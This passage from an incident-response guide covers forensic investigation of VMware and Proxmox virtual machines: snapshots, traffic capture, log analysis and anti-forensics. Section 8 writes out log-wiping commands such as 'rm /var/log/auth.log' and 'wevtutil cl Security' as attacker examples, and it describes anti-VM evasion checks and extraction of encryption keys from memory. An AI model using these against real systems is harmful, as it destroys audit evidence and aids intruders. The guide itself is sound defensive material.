  cp vm-disk.qcow2 "vm-disk-${snap}.qcow2"
  qemu-img snapshot -a "$snap" "vm-disk-${snap}.qcow2"
  qemu-img convert -f qcow2 -O raw "vm-disk-${snap}.qcow2" "vm-disk-${snap}.raw"
  sha256sum "vm-disk-${snap}.raw" >> snapshot_hashes.txt
done

# 2. Mount each and generate file system timelines
for snap in clean-install post-update pre-incident; do
  mkdir -p "/mnt/forensic/${snap}"
  guestmount -a "vm-disk-${snap}.qcow2" -i --ro "/mnt/forensic/${snap}"
  # Generate bodyfile for each
  find "/mnt/forensic/${snap}" -xdev -printf '%T@ %m %u %g %s %p\n' > \
    "bodyfile-${snap}.txt"
done

# 3. Diff file trees between snapshots
diff <(find /mnt/forensic/clean-install -type f | sort) \
     <(find /mnt/forensic/post-update -type f | sort) > file_changes_snap1_to_snap2.diff

# 4. Compare file hashes between snapshots
diff <(cd /mnt/forensic/clean-install && find . -type f -exec sha256sum {} \; | sort) \
     <(cd /mnt/forensic/post-update && find . -type f -exec sha256sum {} \; | sort) \
  > hash_changes.diff
```

### 4.4 Comparing Snapshots for Change Analysis

For qcow2 external snapshots, the delta file itself contains only changed blocks. You can analyze what changed without mounting:

```bash
# Compare qcow2 images at the block level
qemu-img compare vm-disk-snap1.qcow2 vm-disk-snap2.qcow2
# Reports: identical, different sectors, or images differ in size

# For more granular analysis, use qemu-img map to see allocated regions
qemu-img map --output=json vm-disk-snap-overlay.qcow2 | \
  jq '.[] | select(.data == true)' > changed_regions.json
# This shows which byte ranges in the overlay have actual data
# (i.e., blocks that were written after the snapshot)
```

### 4.5 Recovering Deleted Snapshots

When a snapshot is deleted in VMware, the delta VMDK is merged back into its parent (commit) or child (consolidation). The merge operation overwrites the parent or child blocks, but:

- The `.vmsd` file may retain references to the deleted snapshot (depending on how deletion was performed).
- If the underlying storage uses copy-on-write (ZFS, Ceph RBD), the pre-merge state may exist in storage-level snapshots.
- File carving on the datastore may recover fragments of deleted delta VMDKs.

For Proxmox/QEMU:

```bash
# Internal snapshot deletion
qemu-img snapshot -d <snapname> vm-disk.qcow2
# The clusters are dereferenced (refcount decremented) but not zeroed.
# If refcount reaches 0, the cluster is "free" but data persists until overwritten.

# Recovery approach: use qemu-img check to find leaked clusters
qemu-img check -r leaks vm-disk.qcow2
# Leaked clusters are clusters with refcount 0 but containing data

# Advanced: parse qcow2 L1/L2 tables manually to find orphaned clusters
# using tools like qcow2-dump or custom Python scripts against the qcow2 spec
```

### 4.6 Snapshot-Based Timeline Reconstruction

Combining snapshot metadata with filesystem timestamps and log analysis produces a multi-layered timeline:

```
2026-01-15T10:30:00Z  Snapshot "clean-install" created     [snapshot metadata]
2026-01-20T03:14:22Z  /usr/bin/sshd modified                [filesystem MACB]
2026-01-20T03:14:25Z  /tmp/.x11-unix/.cache created         [filesystem MACB — suspicious]
2026-02-20T14:45:00Z  Snapshot "post-update" created        [snapshot metadata]
2026-03-01T22:18:01Z  auth.log: failed SSH from 198.51.x.x  [log analysis]
2026-03-01T22:18:44Z  auth.log: accepted SSH root@pts/0     [log analysis — brute force success]
2026-03-01T22:19:02Z  /tmp/bc created (ELF binary)          [filesystem — malware drop]
2026-03-10T09:00:00Z  Snapshot "pre-incident" created       [snapshot metadata]
```

This demonstrates how snapshots serve as temporal anchors, enabling the investigator to establish that certain changes occurred within bounded time windows.

---

## 5. Network Forensics in Virtual Environments

### 5.1 Virtual Switch Traffic Capture

#### Port Mirroring on VMware vSwitch

```
# ESXi standard vSwitch — port mirroring is not natively supported.
# Requires Distributed Virtual Switch (DVS) or third-party solutions.

# ESXi CLI: capture traffic on a vmnic or portgroup using pktcap-uw
pktcap-uw --switchport <port_id> --dir 0 -o /tmp/capture.pcap  # ingress
pktcap-uw --switchport <port_id> --dir 1 -o /tmp/capture.pcap  # egress
pktcap-uw --switchport <port_id> --dir 2 -o /tmp/capture.pcap  # both

# Find switch port IDs
esxcli network port list
net-stats -l  # lists portworld IDs
```

#### DVS Port Mirroring in VMware

VMware Distributed Virtual Switch supports SPAN (port mirroring), RSPAN, and ERSPAN:

- **SPAN** — mirrors traffic from source ports to a destination port on the same DVS
- **RSPAN** — mirrors to a VLAN trunk, allowing capture on a remote host
- **ERSPAN** — encapsulates mirrored traffic in GRE, enabling capture across L3 boundaries

Configuration is via vSphere Client: Networking → DVS → Settings → Port Mirroring. For forensic capture, create a mirror session targeting the suspect VM's port group, with the destination being a dedicated forensic capture VM running tcpdump or Wireshark.

#### Proxmox Bridge-Level Capture

Proxmox VMs connect to Linux bridges (`vmbr0`, `vmbr1`, etc.). Traffic capture is straightforward using standard Linux tools:

```bash
# Capture all traffic on the bridge
tcpdump -i vmbr0 -w /evidence/bridge-capture.pcap -c 1000000

# Capture traffic for a specific VM (by its tap interface)
# Find the tap interface for a VM:
qm config <vmid> | grep net
# Output: net0: virtio=AA:BB:CC:DD:EE:FF,bridge=vmbr0
# The tap interface is named tap<vmid>i<net_index>
tcpdump -i tap100i0 -w /evidence/vm100-capture.pcap

# Capture with BPF filter (e.g., only traffic to/from specific IP)
tcpdump -i tap100i0 -w /evidence/vm100-filtered.pcap host 192.168.1.50

# Use tshark for inline analysis
tshark -i tap100i0 -Y "http.request" -T fields \
  -e ip.src -e ip.dst -e http.host -e http.request.uri
```

### 5.2 NetFlow and Flow Analysis from Virtual Networks

For high-volume environments where full packet capture is impractical, flow data provides metadata about network conversations.

```bash
# On Proxmox hosts using Open vSwitch (OVS) instead of Linux bridge:
# Enable sFlow or NetFlow export
ovs-vsctl -- --id=@sflow create sflow agent=eth0 \
  target=\"collector.example.com:6343\" sampling=64 polling=10 \
  -- set bridge br0 sflow=@sflow

# Or NetFlow:
ovs-vsctl -- --id=@nf create netflow targets=\"collector:2055\" \
  active-timeout=60 -- set bridge br0 netflow=@nf

# For Linux bridges without OVS, use nfpcapd or softflowd:
softflowd -i vmbr0 -n collector:2055 -v 9
```

### 5.3 NSX-T / NSX Distributed Firewall Logs

VMware NSX provides distributed firewalling at the hypervisor level. Firewall logs contain per-flow decisions (ALLOW/DROP/REJECT) with source/destination, protocol, port, rule ID, and direction. These logs are invaluable for forensic reconstruction:

```
# NSX-T firewall log location on ESXi transport nodes:
/var/log/dfwpktlogs.log

# Log format (space-delimited):
# timestamp  vmid  vnic  direction  action  rule_id  proto  src_ip  dst_ip  src_port  dst_port  pkt_len
# Example:
# 2026-03-01T22:18:01.123Z 1234 vmk0 IN PASS 1001 6 198.51.100.5 192.168.1.50 54321 22 60
```

### 5.4 OVS Flow Analysis

Open vSwitch maintains flow tables that record forwarding decisions. These tables reveal which packets were handled and how:

```bash
# Dump all flow entries
ovs-ofctl dump-flows br0

# Dump flow entries with statistics (byte/packet counts)
ovs-ofctl dump-flows br0 --rsort=n_packets

# Trace a specific packet path through OVS
ovs-appctl ofproto/trace br0 \
  in_port=1,dl_src=AA:BB:CC:DD:EE:FF,dl_dst=11:22:33:44:55:66,\
  dl_type=0x0800,nw_src=192.168.1.50,nw_dst=10.0.0.1,nw_proto=6,\
  tp_src=54321,tp_dst=443
```

### 5.5 Reconstructing Network Activity from Hypervisor Logs

Hypervisor logs contain network configuration events that supplement packet captures:

```bash
# Proxmox — firewall logs (if pve-firewall is enabled)
cat /var/log/pve-firewall.log
# Format: timestamp chain action IN=<if> SRC=<ip> DST=<ip> PROTO=<proto> SPT=<port> DPT=<port>

# Proxmox — DHCP leases (if using Proxmox DHCP)
cat /var/lib/misc/dnsmasq.leases

# VMware — vmkernel network events
grep -i "network\|portgroup\|vswitch\|nic" /var/log/vmkernel.log
```

---

## 6. Hypervisor Log Analysis

### 6.1 ESXi Logs

ESXi maintains multiple log files, each covering a specific subsystem:

| Log File | Path | Content | Forensic Value |
|---|---|---|---|
| `vmkernel.log` | `/var/log/vmkernel.log` | Kernel-level events: storage, network, device drivers, warnings | Storage errors, NIC link changes, SCSI sense codes, kernel panics |
| `hostd.log` | `/var/log/hostd.log` | Host agent: VM power operations, configuration changes, authentication | Who logged in, what VMs were started/stopped, config modifications |
| `vpxa.log` | `/var/log/vpxa.log` | vCenter agent: tasks received from vCenter, inventory sync | vCenter-initiated operations, migration tasks, policy changes |
| `fdm.log` | `/var/log/fdm.log` | Fault Domain Manager: HA cluster state, host isolation, VM restarts | HA events, unexpected VM restarts, host failures |
| `vobd.log` | `/var/log/vobd.log` | VMware Observability daemon: event aggregation | Summarized events, health monitoring |
| `shell.log` | `/var/log/shell.log` | SSH/shell command history | Direct CLI access, potentially unauthorized commands |
| `auth.log` | `/var/log/auth.log` | Authentication: SSH, DCUI, web client | Failed/successful logins, brute force attempts |

**Log parsing examples:**

```bash
# Search for authentication events
grep -i "authentication\|login\|session" /var/log/hostd.log

# Find VM power state changes
grep "VmPoweredOn\|VmPoweredOff\|VmSuspended\|VmResetting" /var/log/hostd.log

# Find snapshot operations
grep -i "snapshot\|CreateSnapshot\|RemoveSnapshot\|RevertSnapshot" /var/log/hostd.log

# Find vMotion events
grep -i "vmotion\|migrate\|relocate" /var/log/vpxa.log

# Extract timestamps and sort chronologically
grep -h "VmPoweredOn\|VmPoweredOff" /var/log/hostd.log | \
  sort -k1,2 > vm_power_timeline.txt
```

### 6.2 Proxmox Logs

Proxmox VE uses systemd journal as the primary logging mechanism, supplemented by application-specific log files:

| Log Source | Access Method | Content |
|---|---|---|
| `pveproxy` | `journalctl -u pveproxy` | Web UI/API requests, authentication |
| `pvedaemon` | `journalctl -u pvedaemon` | Backend daemon, VM operations |
| `pve-firewall` | `/var/log/pve-firewall.log` | Firewall rule matches |
| `QEMU/KVM` | `journalctl -u qemu-server@<vmid>` | Per-VM QEMU process logs |
| `pvestatd` | `journalctl -u pvestatd` | Status daemon, resource usage |
| `corosync` | `journalctl -u corosync` | Cluster communication, quorum |
| `task log` | `/var/log/pve/tasks/` | Individual task logs (migrations, backups) |
| `auth log` | `/var/log/auth.log` or `journalctl -t sshd` | SSH and PAM authentication |
| `access log` | `/var/log/pveproxy/access.log` | API access with source IPs |

**Log parsing examples:**

```bash
# All authentication events in the last 24 hours
journalctl --since "24 hours ago" -t sshd -t pvedaemon | grep -i "auth\|login\|session"

# VM lifecycle events for a specific VM
journalctl -u pvedaemon --since "2026-03-01" | grep "VM <vmid>"

# Task history (Proxmox maintains structured task logs)
pvesh get /nodes/$(hostname)/tasks --limit 100 --output-format json | \
  jq '.[] | {starttime, endtime, type, status, user, id}'

# API access logs — who accessed what
cat /var/log/pveproxy/access.log | \
  awk '{print $1, $4, $5, $6, $7}' | grep -v "200\|304"  # show non-OK requests

# QEMU process events for a specific VM
journalctl -u qemu-server@100 --since "2026-03-01" --no-pager

# Cluster membership changes
journalctl -u corosync --since "7 days ago" | grep -i "member\|quorum\|join\|leave"

# Storage operations
journalctl -u pvedaemon --since "2026-03-01" | grep -i "storage\|volume\|disk\|import\|export"
```

### 6.3 Authentication Log Analysis

```bash
# Comprehensive auth timeline — combine sources
{
  # SSH authentication
  journalctl -t sshd --since "2026-03-01" --output short-iso

  # Proxmox API authentication
  grep "authentication" /var/log/pveproxy/access.log

  # PAM authentication
  journalctl -t pam_unix --since "2026-03-01" --output short-iso
} | sort > auth_timeline.txt

# Detect brute force patterns
journalctl -t sshd --since "7 days ago" | \
  grep "Failed password" | \
  awk '{print $NF}' | sort | uniq -c | sort -rn | head -20
# Shows top 20 source IPs by failed login count

# Detect successful logins after failures (credential stuffing indicator)
grep "Accepted password\|Accepted publickey" /var/log/auth.log | \
  while read -r line; do
    ip=$(echo "$line" | awk '{print $(NF-3)}')
    if grep -q "Failed password.*$ip" /var/log/auth.log; then
      echo "SUSPICIOUS: Success after failures from $ip: $line"
    fi
  done
```

### 6.4 VM Lifecycle Events

Tracking VM creation, deletion, migration, and snapshot operations provides crucial forensic context:

```bash
#!/bin/bash
# vm_lifecycle_timeline.sh — Extract VM lifecycle events from Proxmox logs
# Usage: ./vm_lifecycle_timeline.sh <vmid> <start_date>

VMID="${1:?Usage: $0 <vmid> <start_date>}"
START="${2:?Usage: $0 <vmid> <start_date>}"

echo "=== VM ${VMID} Lifecycle Timeline since ${START} ==="

# Creation/deletion
journalctl -u pvedaemon --since "$START" --no-pager | \
  grep -E "VM ${VMID}|qemu-server@${VMID}" | \
  grep -iE "create|destroy|delete|start|stop|shutdown|reset|suspend|resume|migrate|snapshot|clone|template" | \
  while IFS= read -r line; do
    timestamp=$(echo "$line" | awk '{print $1, $2, $3}')
    event=$(echo "$line" | sed "s/.*${VMID}//")
    echo "${timestamp} | VM ${VMID} | ${event}"
  done | sort

# Task-based events (more structured)
echo ""
echo "=== Task Log ==="
find /var/log/pve/tasks/ -name "*${VMID}*" -newer /dev/null | while read -r f; do
  echo "--- $(basename "$f") ---"
  cat "$f"
done
```

### 6.5 Correlating Host and Guest Events

The most powerful forensic technique is correlating hypervisor-level events with guest-level artifacts:

```
Hypervisor event                          Guest event (from disk/memory)
─────────────────                         ─────────────────────────────
2026-03-01T22:17:50Z  SSH login to host   
2026-03-01T22:18:01Z                      Guest auth.log: SSH from 198.51.x.x
2026-03-01T22:18:44Z                      Guest auth.log: root login accepted
2026-03-01T22:19:02Z                      Guest fs: /tmp/bc created (malware)
2026-03-01T22:19:30Z  Storage I/O spike   
2026-03-01T22:20:15Z                      Guest cron: new crontab entry
2026-03-01T22:21:00Z  Network traffic     Guest: outbound connection to C2
                      spike on tap100i0
2026-03-01T22:25:00Z  Snapshot deleted     
                      (evidence destruction?)
```

Time synchronization between host and guest is critical. Verify NTP configuration on both. A time skew as small as a few seconds can complicate event correlation. Document the skew if found.

---

## 7. Cloud and Virtualization-Specific Artifacts

### 7.1 VM Escape Attempt Indicators

VM escape (hypervisor breakout) is a critical security event. Indicators in hypervisor logs and host state include:

- **Abnormal QEMU process crashes** — repeated segfaults in the QEMU process, especially in virtual device emulation code (virtio, USB passthrough, GPU passthrough). Check `dmesg`, `journalctl -u qemu-server@<vmid>`, and core dumps in `/var/lib/systemd/coredump/`.
- **Unexpected host processes spawned by QEMU** — the QEMU process should not spawn child processes. Monitor with `pstree -p $(pgrep qemu)` or audit rules on execve from QEMU's PID.
- **Exploitation of emulated devices** — CVEs in QEMU device emulation (e.g., CVE-2015-3456 "VENOM" in floppy controller, CVE-2020-14364 in USB emulation) leave traces in QEMU error logs and potentially in guest-initiated I/O patterns to unusual device ports.
- **Hypervisor memory corruption** — QEMU crashes with ASAN (Address Sanitizer) reports, or unexpected memory mappings in `/proc/<qemu_pid>/maps`.

**MITRE ATT&CK mapping:** T1611 — Escape to Host.

### 7.2 Inter-VM Communication Artifacts

On the same hypervisor, VMs can communicate through the virtual switch without generating traffic visible to external network monitoring. This is the virtual equivalent of lateral movement on a shared physical switch segment.

Artifacts to examine:

- **Bridge/vSwitch flow tables** — `bridge fdb show` on Linux bridges, `ovs-ofctl dump-flows` on OVS
- **ARP tables on the host bridge** — `bridge fdb show dev vmbr0` or `ip neigh show`
- **iptables/nftables counters on host** — if the host firewall is configured to log inter-VM traffic
- **VM NIC statistics** — `cat /sys/class/net/tap100i0/statistics/tx_bytes` (asymmetric counts may indicate data exfiltration between VMs)

### 7.3 Hypervisor Configuration Changes

Unauthorized changes to hypervisor configuration may indicate compromise at the host level:

```bash
# Proxmox — VM configuration is stored in Corosync's pmxcfs
# Configuration history is in the cluster filesystem
ls -la /etc/pve/qemu-server/
# Each .conf file has modification timestamps

# Check for recent modifications
find /etc/pve/ -mtime -7 -type f -ls

# Proxmox stores node configuration in:
cat /etc/pve/datacenter.cfg
cat /etc/pve/storage.cfg
cat /etc/pve/user.cfg      # User and permission database
cat /etc/pve/priv/          # Certificates and keys

# Compare against known-good baseline (if one exists)
diff /backup/baseline/datacenter.cfg /etc/pve/datacenter.cfg
```

### 7.4 Resource Usage Anomalies

Abnormal resource usage patterns can indicate unauthorized activity:

| Pattern | Possible Indicator | MITRE ATT&CK |
|---|---|---|
| Sustained high CPU on a low-activity VM | Cryptomining (T1496) | T1496 Resource Hijacking |
| Unusual network traffic volume | Data exfiltration, C2 beaconing | T1041 Exfiltration Over C2 Channel |
| Disk I/O spikes at odd hours | Data staging, log manipulation | T1074 Data Staged |
| Memory usage growth without application changes | Memory-resident malware | T1055 Process Injection |
| VM creating outbound connections to Tor/anonymizer | C2 via anonymization network | T1090.003 Multi-hop Proxy |

```bash
# Proxmox — historical resource usage via rrdcached
# RRD data is stored per-VM
ls /var/lib/rrdcached/db/pve2-vm/<vmid>/

# Query CPU usage anomalies (using pvesh API)
pvesh get /nodes/$(hostname)/qemu/<vmid>/rrddata --timeframe hour --output-format json | \
  jq '.[] | select(.cpu > 0.8) | {time: .time, cpu: .cpu}'

# Network traffic anomalies
pvesh get /nodes/$(hostname)/qemu/<vmid>/rrddata --timeframe day --output-format json | \
  jq '.[] | select(.netin > 100000000 or .netout > 100000000) | {time: .time, netin: .netin, netout: .netout}'
```

### 7.5 Virtual Hardware Change Logs

Changes to a VM's virtual hardware configuration (adding NICs, disks, USB devices, PCI passthrough) may indicate attacker activity:

```bash
# Proxmox — VM configuration changelog
# The cluster filesystem logs changes
# Check git-like history in /etc/pve (it's backed by a pmxcfs FUSE filesystem)

# Recent VM config changes
journalctl -u pvedaemon --since "7 days ago" | grep -i "update VM\|set VM\|config change"

# Compare current config against a known-good snapshot
diff /backup/configs/<vmid>.conf /etc/pve/qemu-server/<vmid>.conf
```

### 7.6 Template and Clone Provenance

When investigating a compromised VM, determining its origin is important:

- Was it cloned from a template? If the template was compromised, all clones are suspect.
- When was it created? Cross-reference with known compromise timeline.
- What modifications were made post-clone?

```bash
# Proxmox — check if VM was cloned
journalctl -u pvedaemon | grep "clone\|template" | grep <vmid>

# Check the VM configuration for template markers
grep -i "template\|parent\|clone" /etc/pve/qemu-server/<vmid>.conf

# Check disk image backing chain (indicates cloning if backing file is a template)
qemu-img info --backing-chain /var/lib/vz/images/<vmid>/vm-<vmid>-disk-0.qcow2
```

---

## 8. Anti-Forensics in Virtual Environments

### 8.1 VM-Aware Malware — Detection Evasion

Malware commonly employs VM detection to evade analysis in sandboxes, but the same techniques apply in production VMs. Detection methods include:

**Registry/file-based detection:**
- Checking for VMware Tools, QEMU Guest Agent, VirtualBox Guest Additions
- Registry keys: `HKLM\SOFTWARE\VMware, Inc.\VMware Tools`
- File presence: `/usr/bin/qemu-ga`, `/usr/sbin/VBoxService`
- Kernel modules: `lsmod | grep -i "vmw\|qemu\|vbox\|virtio"`

**Hardware fingerprinting:**
- CPUID instruction: hypervisor presence bit (CPUID leaf 1, ECX bit 31)
- MAC address OUI: `00:50:56` (VMware), `52:54:00` (QEMU/KVM), `00:0C:29` (VMware)
- BIOS/SMBIOS strings: `dmidecode` reveals "QEMU", "VMware", "VirtualBox"
- ACPI tables: DSDT contains hypervisor-specific strings
- Timing attacks: RDTSC-based measurements detect hypervisor overhead

**Behavioral detection:**
- Process listing: checking for `vmtoolsd`, `qemu-ga`, `VBoxService`
- Communication ports: VMware backdoor I/O port 0x5658
- Disk model strings: "QEMU HARDDISK", "VMware Virtual disk"

**Forensic response:** When analyzing a compromised VM, check for anti-VM detection code in malware samples. If found, the malware may have altered its behavior specifically because it was running in a VM — the investigator should consider whether the observed behavior differs from what would occur on bare metal. MITRE ATT&CK: T1497 — Virtualization/Sandbox Evasion.

### 8.2 Timestomping in VM Context

Timestomping — modifying file timestamps to defeat timeline analysis — is common in both physical and virtual environments. In VMs, additional considerations apply:

- **Hypervisor clock manipulation** — if the attacker has hypervisor access, they can modify the VM's virtual RTC (Real-Time Clock), causing all subsequent timestamps to be incorrect. Check for NTP offset in guest logs and compare guest timestamps with hypervisor-recorded event times.
- **Snapshot-based timestamp confusion** — reverting a snapshot restores the filesystem state (including timestamps) to the snapshot time, but the hypervisor clock continues forward. This creates a disjunction between file timestamps and actual wall-clock time.
- **MACB timestamp analysis** — use The Sleuth Kit's `mactime` to generate timelines and look for anomalies: files with modification times after their creation times (normal in many cases), files with timestamps in the future or distant past, or clusters of files with identical timestamps (batch timestomping).

```bash
# Detect timestomping: files where $MFT timestamps differ from $FILE_NAME timestamps
# (NTFS-specific — $MFT M-time is stomped, $FILE_NAME is not)
# Use analyzeMFT or Volatility's mftparser
vol -f /evidence/vm-mem.elf windows.mftscan.MFTScan | \
  grep -E "\.exe|\.dll|\.ps1|\.bat" > mft_entries.txt
```

### 8.3 Log Deletion and Rotation Manipulation

Attackers may attempt to cover their tracks by manipulating logs:

- **Direct deletion** — `rm /var/log/auth.log`, `wevtutil cl Security`
- **Selective editing** — removing specific log entries while leaving others intact
- **Rotation manipulation** — triggering `logrotate` to force rotation and compression, then deleting the rotated file
- **Journal corruption** — `journalctl --rotate` followed by deletion of old journal files
- **Syslog poisoning** — injecting false log entries to create alibis or confuse investigators

**Detection strategies:**

```bash
# Check for log gaps (missing time ranges)
journalctl --since "2026-03-01" --until "2026-03-02" --output short-iso | \
  awk '{print $1}' | uniq -c | sort -n | head
# Unusually low counts in specific hours suggest deletion

# Check file modification times on log files
stat /var/log/auth.log /var/log/syslog /var/log/kern.log

# Check for logrotate runs
grep "logrotate" /var/log/syslog

# Verify journal file integrity
journalctl --verify

# Check for gaps in journal sequence numbers
journalctl --header | grep "File\|Sequence"
```

### 8.4 Snapshot Deletion as Evidence Destruction

Deleting snapshots is a particularly effective anti-forensic technique in virtual environments:

- VMware snapshot deletion merges delta VMDKs, overwriting the independent delta layer
- QEMU internal snapshot deletion frees clusters but does not zero them (partial recovery possible)
- QEMU external snapshot deletion (via `blockdev-snapshot-delete-backing-file`) removes the backing relationship

**Detection and mitigation:**

```bash
# Check for recent snapshot deletions in Proxmox
journalctl -u pvedaemon --since "7 days ago" | grep -i "delete.*snapshot\|remove.*snapshot"

# VMware — check vpxd/hostd logs for RemoveSnapshot tasks
grep "RemoveSnapshot_Task\|removeSnapshot" /var/log/hostd.log

# Check .vmsd for snapshot count discrepancies
# If snapshot.lastUID is higher than snapshot.numSnapshots, snapshots were deleted

# Storage-level protection: ZFS snapshots of the datastore
zfs list -t snapshot rpool/data
# ZFS snapshots of the storage pool preserve the pre-deletion state of VM images
```

### 8.5 Secure Deletion in Thin-Provisioned Storage

Thin-provisioned storage (qcow2 sparse, LVM thin, ZFS thin) introduces a complication: the `TRIM`/`DISCARD` mechanism tells the storage layer that blocks are no longer in use, allowing the storage subsystem to reclaim them.

- When a file is deleted inside a VM with TRIM-enabled virtio-blk/virtio-scsi, the guest sends TRIM commands to the virtual disk.
- The hypervisor translates these to `fallocate(FALLOC_FL_PUNCH_HOLE)` on the qcow2 file, literally zeroing and deallocating clusters.
- Unlike traditional magnetic media where "deleted" data persists until overwritten, TRIM-punched holes contain no recoverable data.

**Forensic implication:** thin-provisioned VMs with TRIM enabled are significantly harder to investigate with file carving techniques. If forensic readiness is a priority, consider disabling TRIM on forensically-sensitive VMs (performance tradeoff) or using thick-provisioned storage.

### 8.6 Encryption as Anti-Forensic Technique

Full-disk encryption (LUKS, BitLocker) and qcow2-level encryption prevent forensic access to disk contents without the key. Strategies:

- **Memory forensics first** — encryption keys may be in VM memory. For LUKS, the master key is held in kernel memory. For BitLocker, the Full Volume Encryption Key (FVEK) can be extracted from memory using Volatility or Elcomsoft Forensic Disk Decryptor.
- **Snapshot with memory** — if a snapshot includes memory state, the encryption keys are preserved in the memory dump.
- **Key recovery from hypervisor process memory** — the QEMU process maps the guest's physical memory into its virtual address space. If QEMU is still running, the host-side process memory (`/proc/<qemu_pid>/mem`) contains the guest memory, including encryption keys.

```bash
# Attempt LUKS key extraction from memory dump
vol -f /evidence/vm-mem.elf linux.bash.Bash  # Check for passphrase in history

# For BitLocker, Volatility's bitlocker plugin (community):
vol -f /evidence/vm-mem.elf windows.bitlocker.Bitlocker

# Alternatively, search for known key material patterns
vol -f /evidence/vm-mem.elf yarascan.YaraScan \
  --yara-rules 'rule aes_key { strings: $a = { 01 00 00 00 03 66 00 00 } condition: $a }'
```

### 8.7 Detecting Anti-Forensic Activity

Indicators that anti-forensic techniques have been employed:

| Indicator | Detection Method | Significance |
|---|---|---|
| Missing log time ranges | Journal gap analysis, log sequence check | Probable log deletion |
| Files with impossible timestamps | mactime timeline analysis | Timestomping |
| Deleted snapshot discrepancy | `.vmsd` UID vs count comparison | Evidence destruction |
| Shredding tools in history | bash history, process listing | Secure deletion attempt |
| Large TRIM operations | `iostat -x`, block layer traces | Thin-provision-based destruction |
| Anti-VM checks in malware | Static analysis of binaries | Environment-aware evasion |
| Encrypted volumes without business need | Disk layout analysis | Data concealment |

MITRE ATT&CK mapping: T1070 — Indicator Removal; T1070.001 — Clear Windows Event Logs; T1070.002 — Clear Linux or Mac System Logs; T1070.003 — Clear Command History; T1070.004 — File Deletion; T1070.006 — Timestomp.

---

## 9. Incident Response Integration

### 9.1 IR Workflow Adapted for Virtual Environments

The standard NIST SP 800-61r3 incident response lifecycle (Preparation → Detection & Analysis → Containment → Eradication → Recovery → Post-Incident) requires adaptation for virtualized infrastructure:

**Preparation:**
- Maintain current inventory of all VMs, templates, and snapshots
- Pre-deploy forensic tools on hypervisor hosts (LiME modules for guest kernels, Volatility symbol tables, tcpdump)
- Configure centralized log aggregation with WORM storage
- Establish forensic hold procedures that prevent snapshot deletion and VM destruction
- Define evidence acquisition runbooks specific to your hypervisor (ESXi vs Proxmox)

**Detection & Analysis (virtualization-specific):**
- Monitor hypervisor-level indicators (unusual VM spawning, snapshot operations, configuration changes)
- Correlate guest-level alerts with host-level events
- Check for lateral movement between VMs on the same host

**Containment (virtualization advantages):**
- **Network isolation** — modify the VM's vNIC to connect to an isolated bridge/portgroup with no external connectivity but with a forensic monitoring tap
- **Snapshot before containment** — take a memory-inclusive snapshot before any containment action
- **Pause vs power off** — pausing a VM freezes its state (preserving memory) without triggering shutdown scripts that may destroy evidence; powering off loses volatile state but prevents ongoing malicious activity
- **Clone for analysis** — clone the compromised VM to an isolated environment for analysis while preserving the original

```bash
# Proxmox containment workflow
# 1. Snapshot with memory (RAM state preserved)
qm snapshot <vmid> forensic-hold --description "IR hold - $(date -u +%Y-%m-%dT%H:%M:%SZ)"

# 2. Network isolation — change bridge to isolated network
qm set <vmid> -net0 virtio,bridge=vmbr_isolated

# 3. Or completely disconnect network
qm set <vmid> -net0 virtio,bridge=vmbr_isolated,link_down=1

# 4. Clone for analysis (full clone, not linked)
qm clone <vmid> <new_vmid> --full --name forensic-analysis-<vmid>
```

### 9.2 Evidence Collection Priority

Adapt RFC 3227 order of volatility for virtual environments:

```
Priority 1 (seconds):  Guest memory → qm monitor dump-guest-memory
Priority 2 (seconds):  Guest network state → tcpdump on tap interface, ss/netstat from guest
Priority 3 (minutes):  Hypervisor process state → /proc/<qemu_pid>/status, /proc/<qemu_pid>/maps
Priority 4 (minutes):  Virtual network config → bridge fdb, OVS flows, iptables
Priority 5 (hours):    Guest disk image → qcow2/vmdk copy with hash verification
Priority 6 (hours):    Hypervisor logs → journalctl export, /var/log/* copy
Priority 7 (days):     Snapshot chain → complete delta chain preservation
Priority 8 (days):     Host disk forensics → hypervisor host imaging (if host compromise suspected)
Priority 9 (weeks):    Network flow data → NetFlow/sFlow from virtual and physical switches
Priority 10 (weeks):   Backup archives → PBS/VMA archives for historical state comparison
```

### 9.3 Coordinating with Cloud Providers

When the virtual environment is hosted by a cloud provider:

- **Formal evidence request** — most providers require a legal process (subpoena, court order, or law enforcement request) for hypervisor-level evidence. Tenant-accessible evidence (disk snapshots, VPC flow logs, CloudTrail/audit logs) can typically be self-served.
- **Provider preservation requests** — issue a litigation hold / evidence preservation request to the provider as early as possible. Cloud providers routinely delete logs after retention periods expire.
- **Shared responsibility** — understand the shared responsibility model. The provider is responsible for hypervisor security and can provide hypervisor-level artifacts; the tenant is responsible for guest OS and application-level evidence.
- **Response time** — provider forensic support SLAs vary. AWS, Azure, and GCP offer incident response teams for enterprise customers, but response times range from hours to days.

### 9.4 Chain of Custody for Virtual Evidence

Virtual evidence requires rigorous chain of custody because it is trivially duplicable and modifiable:

```
+------------------------------------------------------------------+
| CHAIN OF CUSTODY LOG — VIRTUAL EVIDENCE                           |
+------------------------------------------------------------------+
| Case Number: IR-2026-0042                                        |
| Evidence ID: VE-001                                              |
| Description: Memory dump of VM 100 (webserver-prod)              |
| Original Location: proxmox-node1:/tmp/vm-100-mem.elf             |
| Acquisition Method: QMP dump-guest-memory -p                     |
| Acquisition Tool: QEMU 8.2.2 via qm monitor                     |
| Acquisition Time: 2026-03-01T22:30:00Z                           |
| Acquiring Examiner: [Name], [Title]                               |
| SHA-256: a1b2c3d4e5f6...                                        |
|                                                                  |
| Transfer Log:                                                    |
| DateTime (UTC)     | From           | To             | Purpose   |
| 2026-03-01T22:45Z  | proxmox-node1  | forensic-ws    | Analysis  |
| 2026-03-01T22:46Z  | forensic-ws    | evidence-vault | Storage   |
|                                                                  |
| Hash Verification:                                               |
| DateTime (UTC)     | Verifier       | Hash Match | Notes        |
| 2026-03-01T22:45Z  | [Name]         | YES        | Post-transfer|
| 2026-03-01T22:46Z  | [Name]         | YES        | Pre-storage  |
+------------------------------------------------------------------+
```

### 9.5 Court Admissibility of Virtual Evidence

To maximize admissibility of virtual forensic evidence:

1. **Write-blocking equivalent** — use `--ro` flags on guestmount, read-only mode on all analysis tools. Document that write-blocking was employed.
2. **Hash verification** — SHA-256 hash at acquisition, after every transfer, and before analysis. MD5 alone is insufficient due to collision vulnerabilities (despite its continued acceptance in many courts).
3. **Tool validation** — document tool names, versions, and known error rates. Cite validation studies where available (NIST CFTT results for disk imaging tools, academic validation of Volatility).
4. **Reproducibility** — another examiner with the same tools, same evidence, and same methodology should reach the same conclusions. Document every step in sufficient detail for reproduction.
5. **Expert witness preparation** — the examiner must be prepared to explain:
   - How a hypervisor works at a conceptual level
